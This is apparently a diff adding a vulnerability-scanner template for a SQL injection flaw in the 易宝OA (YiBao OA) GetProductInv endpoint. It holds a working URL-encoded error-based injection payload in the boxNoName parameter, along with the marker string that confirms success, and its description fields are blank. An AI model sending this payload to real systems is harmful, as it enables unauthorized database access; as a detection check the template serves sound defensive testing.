@@ -1,0 +1,16 @@
+id:
+info:
+  name: 易宝OA GetProductInv SQL注入漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /SmartTradeScan/Inventory/GetProductInv?boxNoName=1%27%20AND%201411%20IN%20(SELECT%20(CHAR(113)%2bCHAR(98)%2bCHAR(112)%2bCHAR(112)%2bCHAR(113)%2b(SELECT%20(CASE%20WHEN%20(1411=1411)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2bCHAR(113)%2bCHAR(120)%2bCHAR(122)%2bCHAR(122)%2bCHAR(113)))--%20YyAm&positionName=2&productID=3&opeID=4
+response1:
+  headers:
+  body: qbppq1qxzzq
+  code:
+requests2:
+response2:
